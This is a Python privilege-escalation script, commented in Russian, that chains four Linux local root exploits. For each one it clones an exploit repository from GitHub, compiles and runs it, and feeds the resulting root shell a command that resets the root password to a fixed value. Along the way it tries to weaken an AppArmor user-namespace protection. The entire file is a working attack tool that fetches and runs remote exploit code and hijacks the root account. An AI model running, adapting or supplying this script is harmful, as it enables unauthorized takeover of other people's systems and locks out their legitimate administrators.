#!/usr/bin/env python3
# universal_lpe.py - Tries all 4 LPE exploits, changes root password to 'noddened'

import subprocess
import os
import sys
import tempfile
import shutil
import time
from pathlib import Path

NEW_PASSWORD = "noddened"
WORK_DIR = tempfile.mkdtemp(prefix=".x_")

# Репозитории эксплойтов
REPOS = {
    "dirtyfrag": "https://github.com/V4bel/dirtyfrag.git",
    "copyfail": "https://github.com/tgies/copy-fail-c.git",
    "fragnesia": "https://github.com/0xBlackash/CVE-2026-46300.git",
    "snapd": "https://github.com/nomaisthere/CVE-2026-3888.git"
}

def cleanup():
    shutil.rmtree(WORK_DIR, ignore_errors=True)

def change_password():
    """Меняет пароль root на noddened"""
    result = subprocess.run(["chpasswd"], input=f"root:{NEW_PASSWORD}", text=True, capture_output=True)
    return result.returncode == 0

def is_root():
    return os.geteuid() == 0

def run_dirtyfrag():
    """CVE-2026-43500 - Dirty Frag (RxRPC)"""
    print("[*] Trying Dirty Frag (CVE-2026-43500)...")
    
    # Проверка модуля rxrpc
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "rxrpc" not in result.stdout:
        return False
    
    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["dirtyfrag"], "dirtyfrag"], 
                   capture_output=True)
    os.chdir("dirtyfrag")
    subprocess.run(["gcc", "-O0", "-Wall", "-o", "exp", "exp.c", "-lutil"], 
                   capture_output=True)
    
    if not Path("exp").exists():
        return False
    
    # Запуск и отправка команды смены пароля
    try:
        proc = subprocess.Popen(["./exp"], 
                                stdin=subprocess.PIPE, 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE,
                                text=True)
        proc.stdin.write(f"echo 'root:{NEW_PASSWORD}' | chpasswd && echo 'PWD_CHANGED'\nexit\n")
        proc.stdin.flush()
        output, _ = proc.communicate(timeout=10)
        return "PWD_CHANGED" in output
    except:
        return False

def run_copyfail():
    """CVE-2026-31431 - Copy Fail (AF_ALG)"""
    print("[*] Trying Copy Fail (CVE-2026-31431)...")
    
    # Проверка модуля algif_aead
    result = subprocess.run(["lsmod"], capture_output=True, text=True)
    if "algif_aead" not in result.stdout:
        return False
    
    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["copyfail"], "copyfail"], 
                   capture_output=True)
    os.chdir("copyfail")
    subprocess.run(["gcc", "-o", "exploit", "exploit.c", "utils.c", "-Wall"], 
                   capture_output=True)
    
    if not Path("exploit").exists():
        return False
    
    try:
        proc = subprocess.Popen(["./exploit"], 
                                stdin=subprocess.PIPE, 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE,
                                text=True)
        proc.stdin.write(f"echo 'root:{NEW_PASSWORD}' | chpasswd && echo 'PWD_CHANGED'\nexit\n")
        proc.stdin.flush()
        output, _ = proc.communicate(timeout=10)
        return "PWD_CHANGED" in output
    except:
        return False

def run_fragnesia():
    """CVE-2026-46300 - Fragnesia (ESP-in-TCP)"""
    print("[*] Trying Fragnesia (CVE-2026-46300)...")
    
    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["fragnesia"], "fragnesia"], 
                   capture_output=True)
    os.chdir("fragnesia")
    
    # Попытка отключить AppArmor
    apparmor_file = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
    if os.path.exists(apparmor_file):
        try:
            with open(apparmor_file, 'w') as f:
                f.write('0')
        except:
            pass
    
    if Path("CVE-2026-46300.py").exists():
        result = subprocess.run(["python3", "CVE-2026-46300.py"], 
                                capture_output=True, text=True, timeout=30)
        return "root" in result.stdout.lower() or is_root()
    elif Path("CVE-2026-46300.sh").exists():
        result = subprocess.run(["bash", "CVE-2026-46300.sh"], 
                                capture_output=True, text=True, timeout=30)
        return "root" in result.stdout.lower() or is_root()
    return False

def run_snapd():
    """CVE-2026-3888 - snap-confine + systemd-tmpfiles"""
    print("[*] Trying snap-confine (CVE-2026-3888)...")
    
    # Проверка наличия snapd
    result = subprocess.run(["which", "snap"], capture_output=True)
    if result.returncode != 0:
        return False
    
    os.chdir(WORK_DIR)
    subprocess.run(["git", "clone", "--depth", "1", REPOS["snapd"], "snapd_exp"], 
                   capture_output=True)
    os.chdir("snapd_exp/src")
    subprocess.run(["gcc", "-o", "firefox_2404", "firefox_2404.c"], 
                   capture_output=True)
    subprocess.run(["gcc", "-o", "librootshell.so", "-shared", "-fPIC", "librootshell.c"], 
                   capture_output=True)
    
    if not Path("firefox_2404").exists():
        return False
    
    try:
        proc = subprocess.Popen(["./firefox_2404"], 
                                stdin=subprocess.PIPE, 
                                stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE,
                                text=True)
        proc.stdin.write(f"echo 'root:{NEW_PASSWORD}' | chpasswd && echo 'PWD_CHANGED'\nexit\n")
        proc.stdin.flush()
        output, _ = proc.communicate(timeout=60)
        return "PWD_CHANGED" in output
    except:
        return False

def main():
    # Уже root
    if is_root():
        if change_password():
            print("[+] Успешная эксплуатация. Пароль от root - noddened")
        else:
            print("[-] Ошибка")
        cleanup()
        return
    
    # Проверка компилятора
    gcc_check = subprocess.run(["which", "gcc"], capture_output=True)
    if gcc_check.returncode != 0:
        print("[-] Ошибка: gcc не установлен")
        cleanup()
        return
    
    # Перебираем эксплойты
    exploits = [
        ("Dirty Frag", run_dirtyfrag),
        ("Copy Fail", run_copyfail),
        ("Fragnesia", run_fragnesia),
        ("snap-confine", run_snapd)
    ]
    
    for name, func in exploits:
        try:
            if func():
                # Проверяем, действительно ли стали root
                if is_root() or change_password():
                    print("[+] Успешная эксплуатация. Пароль от root - noddened")
                    cleanup()
                    return
        except Exception as e:
            continue
    
    print("[-] Ошибка")
    cleanup()

if __name__ == "__main__":
    main()
